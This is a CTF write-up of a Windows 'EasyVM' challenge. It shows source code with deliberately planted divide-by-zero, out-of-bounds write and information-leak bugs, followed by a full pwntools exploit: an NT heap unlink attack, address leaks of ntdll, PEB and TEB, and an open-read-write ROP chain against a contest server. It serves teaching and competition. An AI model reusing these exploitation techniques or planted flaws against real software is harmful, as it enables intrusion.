EasyVM is a simple VM challenge consisted of some self-designed instructions, including the basic instructions like arithmic, branch and file operation syscalls.

Since it's a exe file, it's a windows pwn challenge.

(Sorry for the poor quality of the pwn challenge, since it's my first time to design a challenge for such a CTF contest.)



### Mitigation

In `start.ps1`，by running `Set-ProcessMitigation -Name EasyVM.exe -Enable DisallowChildProcessCreation` the child process creation of EasyVM.exe is forbidden, so you cannot call `system` to get the shell. The only way is to orw and get the flag.



### Instruction format

The instruction format is as follows in little endian order:

```C
 0000       0          00		 000      000       000         ...
opcode   reg_op     bitwidth   dst_reg  src_reg1  src_reg2      imm
```

The length of the instruction ranges from 2 to 10 bytes, depending on the length of immediate number.

The `opcode` indicates the type of the instruction, `reg_op`decides whether is a register operation, `bitwidth` determines the bit width of the oprand, `xx_regx`determines the index or the target register, and `imm` is the value of the immediate number.



### VM initialization

During VM initialization, it mainly performs memory allocation, syscall table and custom exception table initialization:

```C
typedef struct File
{
	char filename[0x10];
	uint64_t length;
	char* buffer;
} File, *File_t;

typedef struct VMState
{
	int64_t regs[10];
	char *code;
	uint64_t code_len;
	uint64_t *stack;
	uint64_t stack_len;
	char* data;
	uint64_t data_len;
	void (*ExceptionTable[5])(struct VMState *);
	void (*SyscallTable[4])(struct VMState *);
	File_t files[0x10];
} VMState, *VMState_t;

HANDLE StateHeap;
HANDLE FileHeap;
HANDLE BufferHeap;

void InitPrivateHeap()
{
	StateHeap = HeapCreate(0, 0x1000, 0);
	FileHeap = HeapCreate(0, 0x1000, 0);
	BufferHeap = HeapCreate(0, 0x1000, 0);

	if (StateHeap == NULL || FileHeap == NULL || BufferHeap == NULL)
		Error("Create heap failed!");
}

void InitFunctionTables(VMState_t state)
{
	/* To be done */
	state->ExceptionTable[EC_STACK_UNDERFLOW] = stack_underflow;
	state->ExceptionTable[EC_STACK_OVERFLOW] = stack_overflow;
	state->ExceptionTable[EC_ILLEGAL_INSTRUCTION] = illegal_instruction;
	state->ExceptionTable[EC_CODE_BUFFER_VIOLATION] = code_buffer_violation;
	state->ExceptionTable[EC_DATA_BUFFER_VIOLATION] = data_buffer_violation;

	state->SyscallTable[SN_READ] = do_sys_read;
	state->SyscallTable[SN_WRITE] = do_sys_write;
	state->SyscallTable[SN_OPEN] = do_sys_open;
	state->SyscallTable[SN_CLOSE] = do_sys_close;
}

VMState_t InitVM()
{
	VMState_t state = (VMState_t)HeapAlloc(StateHeap, HEAP_ZERO_MEMORY, sizeof(VMState));
	if (state == NULL)
		Error("Create VM failed!");

	InitRegs(state);

	state->code = (char *)HeapAlloc(BufferHeap, HEAP_ZERO_MEMORY, CODE_SIZE);
	state->code_len = CODE_SIZE;
	state->stack = (uint64_t *)HeapAlloc(BufferHeap, HEAP_ZERO_MEMORY, STACK_SIZE);
	state->stack_len = STACK_SIZE / 8;
	state->data = (char *)HeapAlloc(BufferHeap, HEAP_ZERO_MEMORY, DATA_SIZE);
	state->data_len = DATA_SIZE;
	if (state->code == NULL || state->stack == NULL || state->data == NULL)
		Error("Init VM code buffer or stack buffer or data buffer failed!");

	InitFunctionTables(state);
	ClearFiles(state);

	return state;
}
```

There are three private heap created for different purpose.

The 'StateHeap' is used to allocate `VMState` structure, the `FileHeap` is used to allocate `File` strucure and the `BufferHeap` is for code, data, stack and file buffer.

In this way, these three types of heap memory are isolated.



### Vulnerability

In the process of parsing `DIV` instruction, although there is check for division by zero, the check is not so strck.

When the instruction's `reg_op` bit is set (means the oprands are all registers), because only the 8-byte value of the target register is checked, it's not enough to confirm the divisor is definitely not zero. In other words, the masked value decided by the `bitwidth` can still be zero, and thus makes the devision by zero exception occurs.

```C
void OperDiv(VMState_t state)
{
	int64_t src_reg_0_val, src_reg_1_val, src_imm;

	if (REG_OP)
	{
		if (state->regs[SRC_REG_1] == 0)
		{
			puts("Warning: Divide by zero, skipped\n");

			state->regs[RG_PC] += 2;

			return;
		}

		src_reg_0_val = MASK(state->regs[SRC_REG_0]);
		src_reg_1_val = MASK(state->regs[SRC_REG_1]);

		state->regs[DST_REG] = MASK(src_reg_0_val / src_reg_1_val);

		state->regs[RG_PC] += 2;
	}
	else
	{
		if (IMM_8 == 0)
		{
			puts("Warning: Divide by zero, skipped\n");

			state->regs[RG_PC] += 2 + (1ULL << BITWIDTH);

			return;
		}

		switch (BITWIDTH)
		{
			case BW_BYTE:
				src_imm = IMM_8;
				break;
			case BW_WORD:
				src_imm = IMM_16;
				break;
			case BW_DWORD:
				src_imm = IMM_32;
				break;
			case BW_QWORD:
				src_imm = IMM_64;
				break;
			default:
				src_imm = 0;
				break;
		}

		src_reg_0_val = MASK(state->regs[SRC_REG_0]);

		state->regs[DST_REG] = MASK(src_reg_0_val / src_imm);

		state->regs[RG_PC] += 2 + (1ULL << BITWIDTH);
	}
}
```

Though the IDA does not provide exception handling information in the disassembler window, while testing the `DIV` instruction, the program still works fine even if there is a division by zero operation.

Therefore, it can be easily work out that there is definitely a exception handling code exist.

Of course, if you refer to the source code, it will be much more obvious.

```C
__try
{
	OperDiv(state);
}
__except (1)
{
	puts("Warning: Divide by zero, skipped\n");
	state->regs[RG_PC] += 2;
	state->SyscallTable[SN_WRITE] = do_sys_write_vul;
}
```

The exception handling code modify the `write` entry of the syscall table, which deliberately introduce the vulnerability. 

The modified `do_sys_write_vul` make it possible to achieve OOB write of the File buffer.

```C
void do_sys_write_vul(VMState_t state)
{
	int64_t arg0 = state->regs[RG_R1];
	int64_t arg1 = state->regs[RG_R2];
	int64_t arg2 = state->regs[RG_R3];

	if (arg1 < 0 || (uint64_t)arg1 >= state->data_len || (uint64_t)arg2 > state->data_len - arg1)
		state->ExceptionTable[EC_DATA_BUFFER_VIOLATION](state);

	if (arg0 < 3)
	{
		state->regs[RG_R0] = _write(arg0, state->data + arg1, arg2);
	}
	else if (arg0 < 0x10)
	{
		if (state->files[arg0] != NULL)
		{
			if (state->files[arg0]->length < (uint64_t)arg2)
			{
				HeapFree(BufferHeap, 0, state->files[arg0]->buffer);
				state->files[arg0]->buffer = (char*)HeapAlloc(BufferHeap, 0, state->files[arg0]->length);
				if (state->files[arg0]->buffer == NULL)
					Error("Unexpected error!");
				/* Not change file->length here to avoid OOB read */
			}
			/* OOB write here to do unlink attack */
			memcpy(state->files[arg0]->buffer, state->data + arg1, arg2);

			state->regs[RG_R0] = arg2;
		}
	}
}
```

Obviously, the exploitation method is to do unlink attack through OOB write, which is almost the same as unlink attack in the scenario of ptmalloc2.



### Information Leakage

So far, we cannot achieve the final exploitation, since unlink ptmalloc2, the chunk header in windows NT heap is encoded.

Only after we get the Encoding of `BufferHeap` will it be possible to fake a legal chunk header. 

Meanwhile, to accomplish unlink attack, we need to know where the File buffer pointer stored.  That is, the address of `FileHeap`.

Notice that VM will check whether the PC is out of bound before parsing every instruction. 

If the check failed, the corresponding exception handling code `code_buffer_violation` defined during VM initilization will be triggered.

And unlink the other exception handling function, `code_buffer_violation` won't exit after `DumpVMState`, which  means we can keep the VM going on.

```C
if (state->regs[RG_PC] < 0 || (uint64_t)state->regs[RG_PC] > state->code_len - LONGEST_INSN)
	state->ExceptionTable[EC_CODE_BUFFER_VIOLATION](state);

void code_buffer_violation(VMState_t state)
{
	printf("[!]Error: Code Buffer Out of Bounds\n");
	DumpVMState(state);
	/* Not exit here, to provide information leak bug */
}

void DumpVMState(VMState_t state)
{
	int64_t i;

	printf("R0: 0x%016llx, R1: 0x%016llx\n", state->regs[RG_R0], state->regs[RG_R1]);
	printf("R2: 0x%016llx, R3: 0x%016llx\n", state->regs[RG_R2], state->regs[RG_R3]);
	printf("R4: 0x%016llx, R5: 0x%016llx\n", state->regs[RG_R4], state->regs[RG_R5]);
	printf("R6: 0x%016llx, R7: 0x%016llx\n", state->regs[RG_R6], state->regs[RG_R7]);
	printf("PC: 0x%016llx, SP: 0x%016llx\n", state->regs[RG_PC], state->regs[RG_SP]);

	printf("Stack Buffer:\n");
	for (i = state->regs[RG_SP] - 3; i <= state->regs[RG_SP]; i++)
	{
		printf("\t0x%04llx: 0x%016llx\n", i, state->stack[i]);
	}

	printf("Code Buffer:\n");
	printf("\t");
	for (i = state->regs[RG_PC];  i < state->regs[RG_PC] + 0x10; i++)
	{
		printf("0x%02x ", (unsigned char)state->code[i]);
	}
	printf("\n");

	printf("Opened file:\n");
	for (i = 3; i < 0x10; i++)
	{
		if (state->files[i] != NULL)
			printf("\tfileno: %lld filename: %s filesize: %llu\n", i, state->files[i]->filename, state->files[i]->length);
	}
	printf("\n");
}
```

And therefore, making use of the `DumpVMState` we can get Information leakage.

Specifically, as the stack buffer chunk is next to the code buffer chunk, we can use `code_buffer_violation` to leak the encoded header of the stack buffer chunk. 

Besides, since the plain header of stack buffer chunk can be inferred, the value of `BufferHeap` Encoding can be figured out as well.

In the meantime, during the process of syscall `open`，the `dwFlags` argument of function `HeapAlloc` is zero (not `HEAP_ZERO_MEMORY`)， and thus when allocating memory for `File` structure, the contents won't be cleaned up.

Also, since only the first byte of `File->filename` is set to be zero, the original `Blink` of the chunk is unaffected and can be leaked out.

Therefore, we can get the address of `FileBuffer`.

```C
void do_sys_open(VMState_t state)
{
	int64_t arg0 = state->regs[RG_R1];
	int64_t arg1 = state->regs[RG_R2];
	int filename_len;

	if ((uint64_t)arg0 >= state->data_len)
		state->ExceptionTable[EC_DATA_BUFFER_VIOLATION](state);

	filename_len = strlen(state->data + arg0) > state->data_len - arg0 ? state->data_len - arg0 : strlen(state->data + arg0);

	if (arg1 != 0 && arg1 != 1)
	{
		state->regs[RG_R0] = -1;
		return;
	}

	int i;
	for (i = 3; i < 0x10; i++)
	{
		if (state->files[i] == NULL)
			break;
	}

	if (i == 0x10)
	{
		state->regs[RG_R0] = -1;
		return;
	}
	
	state->regs[RG_R0] = i;
	state->files[i] = (File_t)HeapAlloc(FileHeap, 0, sizeof(File));
	if (state->files[i] == NULL)
		Error("Unexpected error!");
	state->files[i]->buffer = NULL;
	state->files[i]->length = 0;
	state->files[i]->filename[0] = 0;
	memcpy(state->files[i]->filename, state->data + arg0, filename_len > 0xF ? 0xF : filename_len);
	state->files[i]->filename[0xF] = 0;
}
```



### Exploit process

In general, the process of the entire exploit is as follows:

1. Use syscall `open` and fill the front 8-byte content of the `File->filename`.

2. Use instruction `call` to set PC to the end of the code buffer and prepare instruction `ret` at target position, and thus the exception is triggered but the VM keeps going on.

3. Get the Encoding of BufferHeap and address of FileBuffer from the dumped information.

4. Use instruction `DIV` to trigger the division by zero exception and introduce the OOB write vulnerability of syscall write.

5. Use OOB write to make heap manipulation and do unlink attack, which hijacks the `File->buffer` points to itself. 

   Then it would be easy to hijack the `File` structure just next to the victim `File` strucure to achieve arbitrary read and write.

6. Use arbitrary read primitive to leak `FileHeap->LockVariable.Lock` (points to a certion offset of `ntdll!RtlpStaticDebugInfo`), and then figure out the loading address of ntdll.

7. Use arbitrary read primitive to leak `ntdll!LdrPeb - 0x98` (points to `peb->TlsBitmapBits`), and then figure out the address of peb.

   Since the offset of peb and teb is constant, we can figure out the address of teb easily as well.

8. Use arbitrary read primitive to leak `ImageBaseAddress` (the loading address of program) in peb and `StackBase` in teb.
9. Use arbitrary read primitive to leak IAT of program to get the loading address of ucrtbase (and any other dll, of course).
10. Construct vm instructions to bruteforce the position of exception handling function's stack frame and use arbitrary write primitive to prepare the ROP chains to orw.



### Some possible problems

1. During the developement of exp, since "\x1A" will be regraded as the end of the character stream if the input mode is charater stream mode in Windows, the following input won't be accepted any more.

   Thus it's neccessary to avoid "\x1A" appearing in the payload.

2. The ROP chain's construction is a little bit different from the ways in Linux platfrom.

   Because in Windows platform, the function will prepare a "register parameter stack area" to store the register parameters, and thus there is need to make some adjustment.

   ![stack frame](https://p0.ssl.qhimg.com/t014166c6e2f8d13c81.png)



### Final exp

```python
from pwn import *
import binascii
import sys

context.arch = 'amd64'
context.log_level = 'debug'

# p = remote("127.0.0.1", 9999)
p = remote("124.71.177.202", 9999)
if len(sys.argv) == 2:
    windbgx.attach(p)

opcode = {
    "HALT":     0x0,
    "ADD":      0x1,
    "SUB":      0x2,
    "MUL":      0x3,
    "DIV":      0x4,
    "LD":       0x5,
    "ST":       0x6,
    "PUSH":     0x7,
    "POP":      0x8,
    "JMP":      0x9,
    "JE":       0xA,
    "JNE":      0xB,
    "CALL":     0xC,
    "RET":      0xD,
    "SYSCALL":  0xE
}

bitwidth = {
    8:  0,
    16: 1,
    32: 2,
    64: 3
}

pack_func = [
    p8,
    p16,
    p32,
    p64
]

'''
     0000       0          00		 000      000       000         ...
    opcode   reg_op     bitwidth   dst_reg  src_reg1  src_reg2      imm
'''

def halt():
    ins = p16(opcode['HALT'])
    return ins

def add_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['ADD']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def add_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['ADD']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def sub_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['SUB']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def sub_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['SUB']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def mul_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['MUL']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def mul_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['MUL']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def div_reg_reg(dst, src1, src2, bits_cnt):
    ins_val = opcode['DIV']
    ins_val |= 1 << 4       # reg_op = 1
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val)
    return ins

def div_reg_imm(dst, src, imm, bits_cnt):
    ins_val = opcode['DIV']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins_val |= src << 10
    ins = p16(ins_val) + pack_func[bitwidth[bits_cnt]](imm)
    return ins

def ld(dst, offset, bits_cnt):
    ins_val = opcode['LD']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins = p16(ins_val) + p16(offset)
    return ins

def st(dst, offset, bits_cnt):
    ins_val = opcode['ST']
    ins_val |= bitwidth[bits_cnt] << 5
    ins_val |= dst << 7
    ins = p16(ins_val) + p16(offset)
    return ins

def push_reg(dst):
    ins_val = opcode['PUSH']
    ins_val |= dst << 7
    ins = p16(ins_val)
    return ins

def push_imm(imm):
    ins_val = opcode['PUSH']    
    ins = p16(ins_val) + p64(imm)
    return ins

def pop(dst):
    ins_val = opcode['POP']
    ins_val |= dst << 7
    ins = p16(ins_val)
    return ins

def jmp(offset):
    ins_val = opcode['JMP']   
    ins = p16(ins_val) + p16(offset)
    return ins

def je(src1, src2, offset):
    ins_val = opcode['JE']   
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val) + p16(offset)
    return ins

def jne(src1, src2, offset):
    ins_val = opcode['JNE']   
    ins_val |= src1 << 10
    ins_val |= src2 << 13
    ins = p16(ins_val) + p16(offset)
    return ins

def call(addr):
    ins_val = opcode['CALL']
    ins = p16(ins_val) + p16(addr)
    return ins

def ret():
    ins = p16(opcode['RET'])
    return ins

def syscall():
    ins = p16(opcode['SYSCALL'])
    return ins

def chunk_head_ctor(size, flags, prev_size, segment_offset, unused_bytes):
    size, prev_size = size >> 4, prev_size >> 4
    chksum = (size >> 8) ^ (size & 0xFF) ^ flags
    head = size | (flags << 16) | (chksum << 24) | (prev_size << 32) | (segment_offset << 48) | (unused_bytes << 56)
    return head

# Leak FileHeap's address
code =  add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 8, 8) + syscall()           # read stdin
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 3
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 3, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 8, 8) + syscall()           # write file 3
code += call(0xFFE)

# BufferHeap Fengshui to do unlink attack
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 4
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 4, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 4
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 5
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 5
code += add_reg_imm(0, 7, 2, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + syscall()                                     # open file 6
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()        # write file 6

# Trigger backdoor to do OOB write
code += add_reg_imm(6, 7, 0x100, 16) + div_reg_reg(0, 7, 6, 8)

# OOB write to hijack chunk head and Flink, Blink
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x50, 8) + syscall()        # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 4, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x50, 8) + syscall()        # write file 4 (OOB write)

# Do unlink attack
code += add_reg_imm(0, 7, 3, 8) + add_reg_imm(1, 7, 4, 8) + syscall()                                                               # close file 4

# now use file 5 to control the struct of file 6 and achieve arbitrary read and write
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 5
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()         # read stdin
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()       # read file 6
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x10, 8) + syscall()        # write stdout

# arbitrary read
for i in range(4):
    code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # read stdin
    code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # write file 5
    code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x8, 8) + syscall()   # read file 6
    code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0, 8) + add_reg_imm(3, 7, 0x10, 8) + syscall()    # write stdout

# Bruteforce return address and ROP
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x100, 16) + add_reg_imm(3, 7, 0x140, 16) + syscall()   # read stdin
bruteforce_stack_code =  ld(5, 0x138, 64) + ld(4, 0x130, 64) + sub_reg_imm(4, 4, 0x8, 64) + st(4, 0x130, 64)                                                           # stack_addr - 8
bruteforce_stack_code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x100, 16) + add_reg_imm(3, 7, 0x38, 8) + syscall()  # write file 5
bruteforce_stack_code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x300, 16) + add_reg_imm(3, 7, 0x8, 8) + syscall()   # read file 6
bruteforce_stack_code += ld(6, 0x300, 64) + jne(5, 6, 0xFFC4) # 4 + 4 + 2 * 2 + 3 * 6 + 4 * 2 + 4 * 2 + 10 + 4 = 60 = 0x3C
code += bruteforce_stack_code
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 1, 8) + add_reg_imm(2, 7, 0x130, 16) + add_reg_imm(3, 7, 0x8, 8) + syscall()    # write stdout
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x140, 16) + add_reg_imm(3, 7, 0x100, 16) + syscall() # write file 6

'''
################ for test
# arbitrary write
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 5, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 5
code += add_reg_imm(0, 7, 0, 8) + add_reg_imm(1, 7, 0, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # read stdin
code += add_reg_imm(0, 7, 1, 8) + add_reg_imm(1, 7, 6, 8) + add_reg_imm(2, 7, 0x8, 8) + add_reg_imm(3, 7, 0x38, 8) + syscall()      # write file 6

# trigger system
code += push_imm(u64("calc\x00\x00\x00\x00"))
code += pop(0)
code += pop(1)
code += pop(1)
################ test done
'''

# End here
code += halt()

# Leak BufferHeap's cookie
code = code.ljust(0xFFE, b"\x00")
code += ret()

# Send code
p.sendafter("Please input your code: \r\n", code)

# Get encoded heap head and calculate heap cookie
p.send("heapaddr")
p.recvuntil("0x0d 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00")
chunk_head = p.recvline()[:-3].replace(b" 0x", b"") + b"0010"
chunk_head = u64(binascii.unhexlify(chunk_head).decode('latin-1'))
heap_cookie = chunk_head ^ chunk_head_ctor(0x1010, 1, 0x1010, 0, 0x10)

# Get FileHeap address from uninitialized chunk
p.recvuntil("heapaddr")
heap_base = u64(p.recvuntil(" ")[:-1].ljust(8, b"\x00")) - 0x150

# Send OOB write payload to do unlink attack
payload =  b'A' * 0x38 
payload += p64(heap_cookie ^ chunk_head_ctor(0x40, 0, 0x40, 0, 0))
payload += p64(heap_base + 0x8d8 - 0x8) + p64(heap_base + 0x8d8)
p.send(payload)

# Send payload to control file 6 to leak ntdll              (1)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(heap_base + 0x2c0) # change files[6]->buffer = _HEAP->LockVariable.Lock thus leak the ntdll base
p.send(payload)
p.send("leakaddr") # leak symbol
p.recvuntil("leakaddr")
ntdll_base = u64(p.recv(8)) - 0x163d40
ntdll_pebldr = ntdll_base + 0x1653a0

# Send payload to control file 6 to leak PEB                (2)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(ntdll_pebldr - 0x98) # change files[6]->buffer = ntdll!PebLdr - 0x80
p.send(payload)
p.recvuntil("leakaddr")
peb = u64(p.recv(8)) - 0x80
teb = peb + 0x1000

# Send payload to control file 6 to leak StackBase          (3)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(teb + 0x8) # change files[6]->buffer = teb + 8 (StackBase)
p.send(payload)
p.recvuntil("leakaddr")
stack_base = u64(p.recv(8))

# Send payload to control file 6 to leak Program base       (4)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(peb + 0x10) # change files[6]->buffer = peb + 0x10 (ImageBaseAddress)
p.send(payload)
p.recvuntil("leakaddr")
prog_base = u64(p.recv(8))

# Send payload to control file 6 to leak ucrtbase           (5)
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'A' * 0x20 + p64(0x100) + p64(prog_base + 0x4198) # change files[6]->buffer = _write IAT
p.send(payload)
p.recvuntil("leakaddr")
ucrtbase_base = u64(p.recv(8)) - 0x15bf0
ucrtbase_system = ucrtbase_base + 0xabba0

# Prepare bruteforce function stack address
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += b'flag.txt'.ljust(0x20, b"\x00") + p64(0x100) + p64(stack_base) # change files[6]->buffer = stack_base
payload += p64(prog_base + 0x20D2) # target symbol value

pop_rcx =    ntdll_base + 0x9217b   # pop rcx ; ret
pop_rdx =    ntdll_base + 0x8fb37   # pop rdx ; pop r11 ; ret
pop_r8 =     ntdll_base + 0x2010b   # pop r8 ; ret
pop_4regs =  ntdll_base + 0x8fb33   # pop r9 ; pop r10 ; pop r11 ; ret
_open =   ucrtbase_base + 0xa2a30
_read =   ucrtbase_base + 0x16270
_write =  ucrtbase_base + 0x15bf0
ropchain =  p64(pop_rcx) + p64(heap_base + 0x8e0) + p64(pop_rdx) + p64(0) + p64(0) + p64(_open) + p64(pop_4regs) + p64(0) * 4
ropchain += p64(pop_rcx) + p64(3) + p64(pop_rdx) + p64(heap_base + 0x8e0) + p64(0) + p64(pop_r8) + p64(0x40) + p64(_read) + p64(pop_4regs) + p64(0) * 4
ropchain += p64(pop_rcx) + p64(1) + p64(pop_rdx) + p64(heap_base + 0x8e0) + p64(0) + p64(pop_r8) + p64(0x40) + p64(_write)
# ropchain = p64(pop_rcx) + p64(heap_base + 0x8e0) + p64(pop_rcx + 1) + p64(ucrtbase_system)

payload += ropchain
p.send(payload)
function_stack_addr = u64(p.recv(8))

'''
################ for test, write exception table and syscall table

# Send payload to control file 6 to leak StateHeap          (6)
payload =  pg
64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += 'A' * 0x20 + p64(0x100) + p64(ntdll_base + 0x168d40 + 0x10) # change files[6]->buffer = ntdll!RtlpProcessHeapsListBuffer + 0x10 (StateHeap)
p.send(payload)
p.recvuntil("leakaddr")
state_heap_base = u64(p.recv(8))

# Send payload to control file 6 to hijack state->exception_table to system
payload =  p64(heap_base + 0x8d8)  # change files[5]->buffer = &files[6]->buffer
payload += 'A' * 0x20 + p64(0x100) + p64(state_heap_base + 0x8e0) # change files[6]->buffer = state->exception_table
p.send(payload)
payload = p64(ucrtbase_system) * 7
p.send(payload)

################ test done
'''

print("------------- Leaked Information -------------")
print("[+] BufferHeap cookie: " + hex(heap_cookie))
print("[+] BufferHeap base: " + hex(heap_base))
print("[+] ntdll base: " + hex(ntdll_base))
print("[+] ucrtbase base: " + hex(ucrtbase_base))
print("[+] PEB: " + hex(peb))
print("[+] TEB: " + hex(teb))
print("[+] prog_base: " + hex(prog_base))
print("[+] stack_base: " + hex(stack_base))
print("[+] function_stack_addr: " + hex(function_stack_addr))
# print("[+] state_heap_base: " + hex(state_heap_base))

p.interactive()
```

